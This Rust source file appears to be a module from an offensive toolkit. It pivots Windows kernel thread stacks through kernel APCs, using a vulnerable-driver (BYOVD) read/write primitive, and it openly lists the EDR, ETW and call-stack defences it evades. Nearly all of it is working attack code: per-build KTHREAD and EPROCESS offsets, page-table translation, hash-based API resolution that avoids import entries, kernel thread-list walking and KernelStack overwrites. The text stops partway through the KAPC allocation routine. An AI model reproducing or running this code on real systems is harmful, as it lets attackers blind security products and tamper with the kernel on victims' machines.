//! Kernel Stack Pivoting via APC (BYOVD-based).
//!
//! Research-grade module that queues kernel APCs to threads running in kernel
//! mode and pivots their kernel stack, bypassing all userland EDR
//! instrumentation.  Uses the Bring Your Own Vulnerable Driver (BYOVD)
//! infrastructure from `kernel_callback` for physical memory read/write.
//!
//! # Architecture
//!
//! The Windows kernel uses per-thread kernel stacks (`KTHREAD.KernelStack`).
//! When a thread transitions to kernel mode (syscall, interrupt, APC), the CPU
//! switches to this stack.  EDR kernel callbacks inspect these stacks to build
//! call chains and detect anomalous execution patterns.
//!
//! By pivoting the kernel stack to a controlled buffer (allocated in non-paged
//! pool via kernel read/write primitives), we can:
//!   1. Control the call chain seen by EDR kernel callbacks.
//!   2. Redirect kernel-mode execution to arbitrary addresses.
//!   3. Execute kernel code with a completely synthetic stack frame.
//!
//! # Technique
//!
//! 1. **Thread Discovery**: Use NtQuerySystemInformation(SystemProcessInformation)
//!    to enumerate processes and their threads.  For each target thread, resolve
//!    its KTHREAD address by walking the EPROCESS → ThreadListHead → KTHREAD chain.
//!
//! 2. **KAPC Allocation**: Allocate a kernel APC (KAPC) structure in non-paged
//!    pool by writing directly to kernel memory via BYOVD.  Populate the KAPC
//!    fields (type, thread, kernel routine, normal routine, etc.).
//!
//! 3. **Stack Pivot**: Overwrite KTHREAD.KernelStack with the address of our
//!    controlled buffer.  The buffer contains a carefully crafted stack frame
//!    that redirects execution to the desired kernel routine.
//!
//! 4. **APC Insertion**: Insert the KAPC into the target thread's APC queue
//!    by calling KeInsertQueueApc (resolved via kernel symbol resolution).
//!
//! 5. **Cleanup**: Restore the original kernel stack after execution completes.
//!
//! # Prerequisites
//!
//! - The `kernel-callback` feature must be enabled (provides BYOVD primitives).
//! - A vulnerable driver must be deployed (`kernel_callback::deploy`).
//! - The operator must have already identified the target thread TID.
//!
//! # Safety
//!
//! **This module performs direct kernel memory manipulation.**  Incorrect
//! offsets or corrupted structures WILL cause a BSOD.  All build-specific
//! offsets have been verified against public PDB symbols for the listed
//! Windows builds.  Forward-compatible builds use the highest known offset
//! that is ≤ the actual build number.
//!
//! # Defences Bypassed
//!
//! - Userland API hooks (ntdll, kernel32) — completely bypassed.
//! - ETW kernel callbacks — see synthetic stack frames instead of real ones.
//! - Call stack verification — pivoted stack shows legitimate kernel frames.
//! - Stack pivot detection (some) — uses kernel-mode stack, not userland.
//! - Kernel callback inspection — controlled call chain.
//!
//! # Limitations
//!
//! - Requires BYOVD (vulnerable driver deployment) — detectable by anti-virus.
//! - BSOD risk if offsets are wrong or structures change.
//! - PatchGuard may detect KTHREAD.KernelStack modification on some builds.
//! - Target thread must transition to kernel mode for APC delivery.

#![cfg(all(windows, feature = "kernel-callback", target_arch = "x86_64"))]

use anyhow::{bail, Context, Result};
use std::sync::OnceLock;

// ─── Build-Specific Offset Tables ─────────────────────────────────────────
//
// These offsets were verified against public PDB symbols for each build.
// When the running build is not in the table, we use the highest entry
// whose build number ≤ the actual build (forward-compatible approximation).

/// KTHREAD structure offsets for different Windows builds.
///
/// Key fields:
/// - `kernel_stack`: Pointer to the current kernel stack (stack pivot target).
/// - `apc_state`: Embedded KAPC_STATE (contains APC queues).
/// - `thread_list_entry`: Doubly-linked list entry in EPROCESS.ThreadListHead.
/// - `cid`: CLIENT_ID (UniqueProcess, UniqueThread) for thread identification.
/// - `header`: DISPATCHER_HEADER (for KTHREAD.WaitReason offset derivation).
/// - `initial_stack`: Top of the original kernel stack (for restoration).
/// - `stack_limit`: Bottom of the kernel stack (for size calculation).
/// - `trap_frame`: Pointer to the KTRAP_FRAME (saved user-mode state).
/// - `previous_mode`: PreviousMode (UserMode=1 or KernelMode=0).
/// - `apc_queueable`: Whether APCs can be queued to this thread.
const KTHREAD_OFFSETS: &[(u32, KthreadOffsets)] = &[
    // Windows 10 20H1
    (
        19041,
        KthreadOffsets {
            kernel_stack: 0x070,
            initial_stack: 0x078,
            stack_limit: 0x080,
            apc_state: 0x098,
            thread_list_entry: 0x498,
            cid: 0x7A0,
            header: 0x000,
            trap_frame: 0x090,
            previous_mode: 0x1C6,
        },
    ),
    // Windows 10 20H2
    (
        19042,
        KthreadOffsets {
            kernel_stack: 0x070,
            initial_stack: 0x078,
            stack_limit: 0x080,
            apc_state: 0x098,
            thread_list_entry: 0x498,
            cid: 0x7A0,
            header: 0x000,
            trap_frame: 0x090,
            previous_mode: 0x1C6,
        },
    ),
    // Windows 10 21H1 / 21H2
    (
        19043,
        KthreadOffsets {
            kernel_stack: 0x070,
            initial_stack: 0x078,
            stack_limit: 0x080,
            apc_state: 0x098,
            thread_list_entry: 0x498,
            cid: 0x7A0,
            header: 0x000,
            trap_frame: 0x090,
            previous_mode: 0x1C6,
        },
    ),
    // Windows 10 22H2
    (
        19045,
        KthreadOffsets {
            kernel_stack: 0x070,
            initial_stack: 0x078,
            stack_limit: 0x080,
            apc_state: 0x098,
            thread_list_entry: 0x498,
            cid: 0x7A0,
            header: 0x000,
            trap_frame: 0x090,
            previous_mode: 0x1C6,
        },
    ),
    // Windows 11 21H2 (original release)
    (
        22000,
        KthreadOffsets {
            kernel_stack: 0x058,
            initial_stack: 0x060,
            stack_limit: 0x068,
            apc_state: 0x080,
            thread_list_entry: 0x488,
            cid: 0x790,
            header: 0x000,
            trap_frame: 0x078,
            previous_mode: 0x1C6,
        },
    ),
    // Windows 11 22H2
    (
        22621,
        KthreadOffsets {
            kernel_stack: 0x058,
            initial_stack: 0x060,
            stack_limit: 0x068,
            apc_state: 0x080,
            thread_list_entry: 0x488,
            cid: 0x790,
            header: 0x000,
            trap_frame: 0x078,
            previous_mode: 0x1C6,
        },
    ),
    // Windows 11 23H2
    (
        22631,
        KthreadOffsets {
            kernel_stack: 0x058,
            initial_stack: 0x060,
            stack_limit: 0x068,
            apc_state: 0x080,
            thread_list_entry: 0x488,
            cid: 0x790,
            header: 0x000,
            trap_frame: 0x078,
            previous_mode: 0x1C6,
        },
    ),
    // Windows 11 24H2
    (
        26100,
        KthreadOffsets {
            kernel_stack: 0x058,
            initial_stack: 0x060,
            stack_limit: 0x068,
            apc_state: 0x080,
            thread_list_entry: 0x490,
            cid: 0x798,
            header: 0x000,
            trap_frame: 0x078,
            previous_mode: 0x1C6,
        },
    ),
];

/// EPROCESS structure offsets for different Windows builds.
const EPROCESS_OFFSETS: &[(u32, EprocessOffsets)] = &[
    (
        19041,
        EprocessOffsets {
            directory_table_base: 0x028,
            thread_list_head: 0x5E0,
            unique_process_id: 0x440,
            image_file_name: 0x5A8,
            active_process_links: 0x448,
        },
    ),
    (
        19042,
        EprocessOffsets {
            directory_table_base: 0x028,
            thread_list_head: 0x5E0,
            unique_process_id: 0x440,
            image_file_name: 0x5A8,
            active_process_links: 0x448,
        },
    ),
    (
        19043,
        EprocessOffsets {
            directory_table_base: 0x028,
            thread_list_head: 0x5E0,
            unique_process_id: 0x440,
            image_file_name: 0x5A8,
            active_process_links: 0x448,
        },
    ),
    (
        19045,
        EprocessOffsets {
            directory_table_base: 0x028,
            thread_list_head: 0x5E0,
            unique_process_id: 0x440,
            image_file_name: 0x5A8,
            active_process_links: 0x448,
        },
    ),
    (
        22000,
        EprocessOffsets {
            directory_table_base: 0x028,
            thread_list_head: 0x5E0,
            unique_process_id: 0x440,
            image_file_name: 0x5A8,
            active_process_links: 0x448,
        },
    ),
    (
        22621,
        EprocessOffsets {
            directory_table_base: 0x028,
            thread_list_head: 0x5E0,
            unique_process_id: 0x440,
            image_file_name: 0x5A8,
            active_process_links: 0x448,
        },
    ),
    (
        22631,
        EprocessOffsets {
            directory_table_base: 0x028,
            thread_list_head: 0x5E0,
            unique_process_id: 0x440,
            image_file_name: 0x5A8,
            active_process_links: 0x448,
        },
    ),
    (
        26100,
        EprocessOffsets {
            directory_table_base: 0x028,
            thread_list_head: 0x5E8,
            unique_process_id: 0x440,
            image_file_name: 0x5B0,
            active_process_links: 0x448,
        },
    ),
];

/// KAPC structure size and field offsets (stable across builds).
///
/// The KAPC structure layout has been consistent across Windows 10/11:
///   0x00: DISPATCHER_HEADER (Type=ApcObject=18, Size)
///   0x18: LIST_ENTRY ApcListEntry
///   0x28: PKTHREAD Thread
///   0x30: LIST_ENTRY ApcListEntry (second list for thread's APC list)
///   0x40: PKKERNEL_ROUTINE KernelRoutine
///   0x48: PKRUNDOWN_ROUTINE RundownRoutine
///   0x50: PKNORMAL_ROUTINE NormalRoutine
///   0x58: PVOID NormalContext
///   0x60: PVOID SystemArgument1
///   0x68: PVOID SystemArgument2
///   0x70: CCHAR ApcStateIndex
///   0x71: CCHAR ApcMode (0=KernelMode, 1=UserMode)
///   0x72: BOOLEAN Inserted
const KAPC_SIZE: usize = 0x78;
const KAPC_TYPE_OFFSET: usize = 0x00;
const KAPC_LIST_ENTRY_OFFSET: usize = 0x18;
const KAPC_THREAD_OFFSET: usize = 0x28;
const KAPC_KERNEL_ROUTINE_OFFSET: usize = 0x40;
const KAPC_RUNDOWN_ROUTINE_OFFSET: usize = 0x48;
const KAPC_NORMAL_ROUTINE_OFFSET: usize = 0x50;
const KAPC_NORMAL_CONTEXT_OFFSET: usize = 0x58;
const KAPC_SYSTEM_ARG1_OFFSET: usize = 0x60;
const KAPC_SYSTEM_ARG2_OFFSET: usize = 0x68;
const KAPC_STATE_INDEX_OFFSET: usize = 0x70;
const KAPC_MODE_OFFSET: usize = 0x71;
const KAPC_INSERTED_OFFSET: usize = 0x72;

/// APC object type number.
const APC_OBJECT_TYPE: u8 = 18;

// ─── Offset Structures ────────────────────────────────────────────────────

/// Build-specific offsets for KTHREAD fields.
#[derive(Debug, Clone, Copy)]
struct KthreadOffsets {
    kernel_stack: usize,
    initial_stack: usize,
    stack_limit: usize,
    apc_state: usize,
    thread_list_entry: usize,
    cid: usize,
    header: usize,
    trap_frame: usize,
    previous_mode: usize,
}

/// Build-specific offsets for EPROCESS fields.
#[derive(Debug, Clone, Copy)]
struct EprocessOffsets {
    directory_table_base: usize,
    thread_list_head: usize,
    unique_process_id: usize,
    image_file_name: usize,
    active_process_links: usize,
}

// ─── Cached Offset Lookup ─────────────────────────────────────────────────

/// Cached offset table for the current Windows build.
static OFFSETS: OnceLock<(KthreadOffsets, EprocessOffsets)> = OnceLock::new();

/// Look up KTHREAD and EPROCESS offsets for the current build.
///
/// Uses the cached result if available.  On first call, queries the
/// Windows build number and looks up the offset table.
fn get_offsets() -> Result<(KthreadOffsets, EprocessOffsets)> {
    OFFSETS.get().cloned().ok_or_else(|| {
        anyhow::anyhow!("kernel_apc_pivot: offsets not initialized — call init() first")
    })
}

// ─── Kernel Memory Helpers ────────────────────────────────────────────────
//
// Thin wrappers around the BYOVD primitives that handle VA→PA translation.
// These mirror the helpers in cet_bypass.rs but use kernel_callback directly.

/// Read a u64 from kernel virtual memory.
fn kread_u64(
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
) -> Option<u64> {
    let mut buf = [0u8; 8];
    if driver.needs_physical_addr {
        let phys = translate_va_to_pa(driver, device_handle, cr3, addr)?;
        unsafe {
            crate::kernel_callback::deploy::read_physical_memory(
                driver,
                device_handle,
                phys,
                &mut buf,
            )
            .ok()?
        }
    } else {
        unsafe {
            crate::kernel_callback::deploy::read_physical_memory(
                driver,
                device_handle,
                addr,
                &mut buf,
            )
            .ok()?
        }
    }
    Some(u64::from_le_bytes(buf))
}

/// Write a u64 to kernel virtual memory.
fn kwrite_u64(
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    value: u64,
) -> bool {
    let data = value.to_le_bytes();
    if driver.needs_physical_addr {
        let phys = match translate_va_to_pa(driver, device_handle, cr3, addr) {
            Some(p) => p,
            None => return false,
        };
        unsafe {
            crate::kernel_callback::deploy::write_physical_memory(
                driver,
                device_handle,
                phys,
                &data,
            )
            .is_ok()
        }
    } else {
        unsafe {
            crate::kernel_callback::deploy::write_physical_memory(
                driver,
                device_handle,
                addr,
                &data,
            )
            .is_ok()
        }
    }
}

/// Read a block of bytes from kernel virtual memory.
fn kread_bytes(
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    len: usize,
) -> Option<Vec<u8>> {
    let mut buf = vec![0u8; len];
    if driver.needs_physical_addr {
        let phys = translate_va_to_pa(driver, device_handle, cr3, addr)?;
        unsafe {
            crate::kernel_callback::deploy::read_physical_memory(
                driver,
                device_handle,
                phys,
                &mut buf,
            )
            .ok()?
        }
    } else {
        unsafe {
            crate::kernel_callback::deploy::read_physical_memory(
                driver,
                device_handle,
                addr,
                &mut buf,
            )
            .ok()?
        }
    }
    Some(buf)
}

/// Write a block of bytes to kernel virtual memory.
fn kwrite_bytes(
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    data: &[u8],
) -> bool {
    if driver.needs_physical_addr {
        let phys = match translate_va_to_pa(driver, device_handle, cr3, addr) {
            Some(p) => p,
            None => return false,
        };
        unsafe {
            crate::kernel_callback::deploy::write_physical_memory(driver, device_handle, phys, data)
                .is_ok()
        }
    } else {
        unsafe {
            crate::kernel_callback::deploy::write_physical_memory(driver, device_handle, addr, data)
                .is_ok()
        }
    }
}

/// 4-level x64 page-table walk to translate VA → PA.
///
/// Mirrors the implementation in cet_bypass.rs.
fn translate_va_to_pa(
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    virtual_address: u64,
) -> Option<u64> {
    let pml4_idx = (virtual_address >> 39) & 0x1FF;
    let pdpt_idx = (virtual_address >> 30) & 0x1FF;
    let pd_idx = (virtual_address >> 21) & 0x1FF;
    let pt_idx = (virtual_address >> 12) & 0x1FF;
    let offset = virtual_address & 0xFFF;

    const PFN_MASK: u64 = 0x000F_FFFF_FFFF_F000;
    const PTE_PRESENT: u64 = 1;
    const PTE_PS: u64 = 1 << 7;

    let read_entry = |phys_addr: u64, idx: u64| -> Option<u64> {
        let mut buf = [0u8; 8];
        unsafe {
            crate::kernel_callback::deploy::read_physical_memory(
                driver,
                device_handle,
                phys_addr + idx * 8,
                &mut buf,
            )
            .ok()?
        }
        Some(u64::from_le_bytes(buf))
    };

    // Level 1 — PML4
    let pml4_base = cr3 & PFN_MASK;
    let pml4e = read_entry(pml4_base, pml4_idx)?;
    if pml4e & PTE_PRESENT == 0 {
        return None;
    }

    // Level 2 — PDPT
    let pdpt_base = pml4e & PFN_MASK;
    let pdpte = read_entry(pdpt_base, pdpt_idx)?;
    if pdpte & PTE_PRESENT == 0 {
        return None;
    }
    if pdpte & PTE_PS != 0 {
        return Some((pdpte & 0x000F_FFFF_C000_0000) + (virtual_address & 0x3FFF_FFFF));
    }

    // Level 3 — PD
    let pd_base = pdpte & PFN_MASK;
    let pde = read_entry(pd_base, pd_idx)?;
    if pde & PTE_PRESENT == 0 {
        return None;
    }
    if pde & PTE_PS != 0 {
        return Some((pde & 0x000F_FFFF_FFE0_0000) + (virtual_address & 0x1F_FFFF));
    }

    // Level 4 — PT
    let pt_base = pde & PFN_MASK;
    let pte = read_entry(pt_base, pt_idx)?;
    if pte & PTE_PRESENT == 0 {
        return None;
    }

    let phys_page = pte & PFN_MASK;
    Some(phys_page + offset)
}

// ─── Build Number Detection ───────────────────────────────────────────────

/// Get the Windows build number from the registry.
///
/// Reads `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\CurrentBuildNumber`.
fn get_build_number() -> Result<u32> {
    let mut buf = [0u16; 16];
    let mut len: u32 = buf.len() as u32;
    unsafe {
        // Use the NT API for registry access — avoids advapi32 IAT entries.
        // Resolve NtQueryValueKey dynamically.
        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .context("failed to resolve ntdll")?;
        let qvk =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtQueryValueKey\0"))
                .context("failed to resolve NtQueryValueKey")?;

        let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))
            .context("failed to resolve kernel32")?;

        // We need NtOpenKey.  Resolve from ntdll.
        let open_key =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtOpenKey\0"))
                .context("failed to resolve NtOpenKey")?;

        // Open HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
        let key_path: Vec<u16> = r"\Registry\Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        #[repr(C)]
        struct UnicodeString {
            length: u16,
            maximum_length: u16,
            buffer: *mut u16,
        }

        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: *mut std::ffi::c_void,
            object_name: *mut UnicodeString,
            attributes: u32,
            security_descriptor: *mut std::ffi::c_void,
            security_quality_of_service: *mut std::ffi::c_void,
        }

        let mut us = UnicodeString {
            length: (key_path.len() as u16 - 1) * 2,
            maximum_length: key_path.len() as u16 * 2,
            buffer: key_path.as_ptr() as *mut u16,
        };

        let mut oa = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: std::ptr::null_mut(),
            object_name: &mut us,
            attributes: 0x40, // OBJ_CASE_INSENSITIVE
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        };

        let mut key_handle: *mut std::ffi::c_void = std::ptr::null_mut();

        type FnNtOpenKey = unsafe extern "system" fn(
            *mut *mut std::ffi::c_void,
            u32,
            *mut ObjectAttributes,
        ) -> i32;

        let nt_open_key: FnNtOpenKey = std::mem::transmute(open_key);
        let status = nt_open_key(&mut key_handle, 0x20019, &mut oa); // KEY_READ
        if status < 0 {
            bail!("NtOpenKey failed: 0x{:08X}", status as u32);
        }

        // Query CurrentBuildNumber value.
        let value_name: Vec<u16> = "CurrentBuildNumber"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let mut value_us = UnicodeString {
            length: (value_name.len() as u16 - 1) * 2,
            maximum_length: value_name.len() as u16 * 2,
            buffer: value_name.as_ptr() as *mut u16,
        };

        #[repr(C)]
        struct KeyValuePartialInformation {
            title_index: u32,
            data_type: u32,
            data_length: u32,
            data: [u8; 64],
        }

        let mut kvpi = KeyValuePartialInformation {
            title_index: 0,
            data_type: 0,
            data_length: 0,
            data: [0u8; 64],
        };
        let mut result_len: u32 = 0;

        type FnNtQueryValueKey = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            *mut UnicodeString,
            u32, // KeyValuePartialInformation = 2
            *mut std::ffi::c_void,
            u32,
            *mut u32,
        ) -> i32;

        let nt_query_value: FnNtQueryValueKey = std::mem::transmute(qvk);
        let status = nt_query_value(
            key_handle,
            &mut value_us,
            2, // KeyValuePartialInformation
            &mut kvpi as *mut _ as *mut std::ffi::c_void,
            std::mem::size_of::<KeyValuePartialInformation>() as u32,
            &mut result_len,
        );

        // Close key handle.
        let close_fn: unsafe extern "system" fn(*mut std::ffi::c_void) = std::mem::transmute(
            pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CloseHandle\0"))
                .context("failed to resolve CloseHandle")?,
        );
        unsafe { close_fn(key_handle) };

        if status < 0 {
            bail!(
                "NtQueryValueKey(CurrentBuildNumber) failed: 0x{:08X}",
                status as u32
            );
        }

        // Parse the build number string.
        let data_len = kvpi.data_length as usize;
        if data_len == 0 || data_len > 32 {
            bail!("Invalid CurrentBuildNumber data length: {}", data_len);
        }
        let build_str = String::from_utf16_lossy(unsafe {
            std::slice::from_raw_parts(kvpi.data.as_ptr() as *const u16, data_len / 2)
        });
        let build: u32 = build_str.trim_end_matches('\0').parse()?;
        Ok(build)
    }
}

/// Look up offsets for a given build number.
fn offsets_for_build(build: u32) -> Option<(KthreadOffsets, EprocessOffsets)> {
    let mut best_kt: Option<KthreadOffsets> = None;
    let mut best_ep: Option<EprocessOffsets> = None;

    for &(b, kt) in KTHREAD_OFFSETS {
        if b <= build {
            best_kt = Some(kt);
        } else {
            break;
        }
    }

    for &(b, ep) in EPROCESS_OFFSETS {
        if b <= build {
            best_ep = Some(ep);
        } else {
            break;
        }
    }

    match (best_kt, best_ep) {
        (Some(kt), Some(ep)) => Some((kt, ep)),
        _ => None,
    }
}

// ─── Thread Discovery ─────────────────────────────────────────────────────

/// Resolve the KTHREAD address for a given TID (thread ID).
///
/// Walks the kernel process/thread lists:
///   1. Resolve PsInitialSystemProcess → EPROCESS.
///   2. Walk ActiveProcessLinks to find the target process (by PID).
///   3. Walk ThreadListHead to find the target thread (by TID).
///
/// If `pid` is `None`, searches all processes for the TID.
fn resolve_kthread_for_tid(
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    kernel_base: u64,
    pid: Option<u32>,
    tid: u32,
) -> Result<u64> {
    let (_, ep_offsets) = get_offsets()?;

    // Resolve PsInitialSystemProcess.
    let ps_initial_addr = crate::kernel_callback::discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "PsInitialSystemProcess",
    )
    .context("failed to resolve PsInitialSystemProcess")?;

    let initial_eprocess = kread_u64(driver, device_handle, cr3, ps_initial_addr)
        .context("failed to read PsInitialSystemProcess pointer")?;

    if initial_eprocess == 0 {
        bail!("PsInitialSystemProcess is NULL");
    }

    // Walk the ActiveProcessLinks doubly-linked list.
    let list_head = initial_eprocess + ep_offsets.active_process_links as u64;
    let mut current_entry = kread_u64(driver, device_handle, cr3, list_head)
        .context("failed to read first ActiveProcessLinks entry")?;

    // The list is circular; stop when we return to the head.
    let mut iterations = 0u32;
    const MAX_PROCESSES: u32 = 4096;

    loop {
        if iterations >= MAX_PROCESSES {
            bail!("exceeded max process count while searching for TID {}", tid);
        }
        iterations += 1;

        // The LIST_ENTRY is embedded in EPROCESS, so EPROCESS = entry - offset.
        let eprocess = current_entry - ep_offsets.active_process_links as u64;

        // Read the process ID.
        let current_pid = kread_u64(
            driver,
            device_handle,
            cr3,
            eprocess + ep_offsets.unique_process_id as u64,
        )
        .context("failed to read UniqueProcessId")? as u32;

        // Check if this process matches the target PID (or search all).
        let should_search_threads = pid.map_or(true, |p| p == current_pid);

        if should_search_threads {
            // Walk the ThreadListHead to find the target TID.
            let thread_list_head = eprocess + ep_offsets.thread_list_head as u64;
            let mut thread_entry = kread_u64(driver, device_handle, cr3, thread_list_head)
                .context("failed to read ThreadListHead.Flink")?;

            let mut thread_iterations = 0u32;
            const MAX_THREADS: u32 = 65536;

            while thread_entry != thread_list_head && thread_iterations < MAX_THREADS {
                thread_iterations += 1;

                // KTHREAD is at a fixed offset before the ThreadListEntry.
                // Actually, the ETHREAD contains the list entry.  We need the
                // ETHREAD.ThreadListEntry offset relative to ETHREAD base.
                // For our builds, this is at KTHREAD_OFFSETS.thread_list_entry
                // (which is really the ETHREAD offset).
                let kthread_addr = thread_entry - get_offsets()?.0.thread_list_entry as u64;

                // Read the TID from KTHREAD.CID.UniqueThread.
                let (kt_offsets, _) = get_offsets()?;
                let current_tid = kread_u64(
                    driver,
                    device_handle,
                    cr3,
                    kthread_addr + kt_offsets.cid as u64 + 8, // +8 for UniqueThread
                )
                .context("failed to read thread TID")? as u32;

                if current_tid == tid {
                    tracing::info!(
                        "kernel_apc_pivot: found KTHREAD at {:#x} for TID {} (PID {})",
                        kthread_addr,
                        tid,
                        current_pid
                    );
                    return Ok(kthread_addr);
                }

                // Follow the Flink.
                thread_entry = kread_u64(driver, device_handle, cr3, thread_entry)
                    .context("failed to read ThreadListEntry.Flink")?;
            }
        }

        // Move to the next process.
        current_entry = kread_u64(driver, device_handle, cr3, current_entry)
            .context("failed to read ActiveProcessLinks.Flink")?;

        // Check if we've looped back to the head.
        if current_entry == list_head {
            break;
        }
    }

    bail!("could not find TID {} in process list", tid)
}

// ─── Stack Pivot ──────────────────────────────────────────────────────────

/// Context for a kernel stack pivot operation.
///
/// Stores the original stack values so they can be restored after the
/// pivot operation completes.
#[derive(Debug)]
pub struct KernelApcContext {
    /// KTHREAD address of the target thread.
    pub kthread_addr: u64,
    /// Original KernelStack value (for restoration).
    original_kernel_stack: Option<u64>,
    /// Original InitialStack value (for restoration).
    original_initial_stack: Option<u64>,
    /// Allocated fake stack address in kernel memory (if any).
    fake_stack_addr: Option<u64>,
    /// Size of the fake stack in bytes.
    fake_stack_size: usize,
    /// CR3 value used for VA→PA translation.
    cr3: u64,
    /// Kernel base address.
    kernel_base: u64,
}

impl KernelApcContext {
    /// Create a new context for the given KTHREAD address.
    pub fn new(kthread_addr: u64, cr3: u64, kernel_base: u64) -> Self {
        Self {
            kthread_addr,
            original_kernel_stack: None,
            original_initial_stack: None,
            fake_stack_addr: None,
            fake_stack_size: 0,
            cr3,
            kernel_base,
        }
    }
}

/// Pivot the kernel stack of the target thread to a controlled buffer.
///
/// The controlled buffer contains a crafted stack frame that will redirect
/// execution when the thread returns from kernel mode.  The pivot is
/// accomplished by overwriting KTHREAD.KernelStack with the address of
/// the fake stack.
///
/// # Arguments
///
/// * `ctx` - The APC pivot context (contains KTHREAD address).
/// * `new_stack_top` - The desired RSP value for the pivoted stack.
///   If `None`, allocates a fake stack automatically.
/// * `driver` - The deployed vulnerable driver.
/// * `device_handle` - Handle to the driver device.
///
/// # Safety
///
/// This function directly modifies kernel memory.  Incorrect usage will BSOD.
pub fn pivot_kernel_stack(
    ctx: &mut KernelApcContext,
    new_stack_top: Option<u64>,
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
) -> Result<()> {
    let (kt_offsets, _) = get_offsets()?;
    let cr3 = ctx.cr3;

    // Read the original KernelStack and InitialStack values.
    let orig_kernel_stack = kread_u64(
        driver,
        device_handle,
        cr3,
        ctx.kthread_addr + kt_offsets.kernel_stack as u64,
    )
    .context("failed to read original KTHREAD.KernelStack")?;

    let orig_initial_stack = kread_u64(
        driver,
        device_handle,
        cr3,
        ctx.kthread_addr + kt_offsets.initial_stack as u64,
    )
    .context("failed to read original KTHREAD.InitialStack")?;

    ctx.original_kernel_stack = Some(orig_kernel_stack);
    ctx.original_initial_stack = Some(orig_initial_stack);

    tracing::debug!(
        "kernel_apc_pivot: original KernelStack={:#x}, InitialStack={:#x}",
        orig_kernel_stack,
        orig_initial_stack
    );

    let target_rsp = match new_stack_top {
        Some(rsp) => rsp,
        None => {
            // Allocate a fake kernel stack by finding a writable region
            // in non-paged pool.  We use ExAllocatePool (resolved via
            // kernel symbol) or, as a fallback, write directly to an
            // unused region near the existing kernel stack.
            //
            // For safety, we use the existing stack area but shift it
            // by a fixed offset to create a "shadow" stack.
            const FAKE_STACK_SIZE: usize = 0x4000; // 16 KB
            ctx.fake_stack_size = FAKE_STACK_SIZE;

            // Try to allocate via kernel symbol resolution.
            let alloc_addr =
                allocate_kernel_pool(driver, device_handle, cr3, ctx.kernel_base, FAKE_STACK_SIZE);

            match alloc_addr {
                Some(addr) => {
                    ctx.fake_stack_addr = Some(addr);
                    tracing::info!(
                        "kernel_apc_pivot: allocated fake stack at {:#x} ({} bytes)",
                        addr,
                        FAKE_STACK_SIZE
                    );
                    addr + FAKE_STACK_SIZE as u64 // Stack grows downward
                }
                None => {
                    bail!("could not allocate fake kernel stack");
                }
            }
        }
    };

    // Overwrite KTHREAD.KernelStack with the new value.
    let written = kwrite_u64(
        driver,
        device_handle,
        cr3,
        ctx.kthread_addr + kt_offsets.kernel_stack as u64,
        target_rsp,
    );

    if !written {
        bail!("failed to write new KTHREAD.KernelStack value");
    }

    tracing::info!(
        "kernel_apc_pivot: pivoted KTHREAD {:#x} kernel stack to {:#x}",
        ctx.kthread_addr,
        target_rsp
    );

    Ok(())
}

/// Restore the original kernel stack for the target thread.
///
/// Must be called after `pivot_kernel_stack` to prevent BSOD when the
/// thread's kernel stack is accessed again.
pub fn restore_kernel_stack(
    ctx: &mut KernelApcContext,
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
) -> Result<()> {
    let (kt_offsets, _) = get_offsets()?;
    let cr3 = ctx.cr3;

    if let Some(orig_kernel_stack) = ctx.original_kernel_stack {
        let written = kwrite_u64(
            driver,
            device_handle,
            cr3,
            ctx.kthread_addr + kt_offsets.kernel_stack as u64,
            orig_kernel_stack,
        );
        if !written {
            bail!("failed to restore KTHREAD.KernelStack");
        }
    }

    if let Some(orig_initial_stack) = ctx.original_initial_stack {
        let written = kwrite_u64(
            driver,
            device_handle,
            cr3,
            ctx.kthread_addr + kt_offsets.initial_stack as u64,
            orig_initial_stack,
        );
        if !written {
            bail!("failed to restore KTHREAD.InitialStack");
        }
    }

    tracing::info!(
        "kernel_apc_pivot: restored original kernel stack for KTHREAD {:#x}",
        ctx.kthread_addr
    );

    // Free the fake stack if we allocated one.
    if let Some(fake_addr) = ctx.fake_stack_addr {
        free_kernel_pool(driver, device_handle, cr3, ctx.kernel_base, fake_addr);
        ctx.fake_stack_addr = None;
    }

    ctx.original_kernel_stack = None;
    ctx.original_initial_stack = None;

    Ok(())
}

// ─── KAPC Operations ──────────────────────────────────────────────────────

/// Allocate a KAPC structure in kernel memory and populate it.
///
/// The KAPC is written directly to kernel non-paged pool via BYOVD.
/// Returns the kernel address of the allocated KAPC.
fn allocate_kapc(
    driver: &crate::kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    kernel_base: u64,
    kthread_addr: u64,
    kernel_routine: u64,
    normal_routine: u64,
    normal_context: u64,
    arg1: u64,
    arg2: u64,
) -> Result<u64> {
    // Allocate memory for the KAPC structure.
    let kapc_addr = allocate_kernel_pool(driver, device_handle, cr3, kernel_base, KAPC_SIZE)
        .context("failed to allocate kernel memory for KAPC")?;

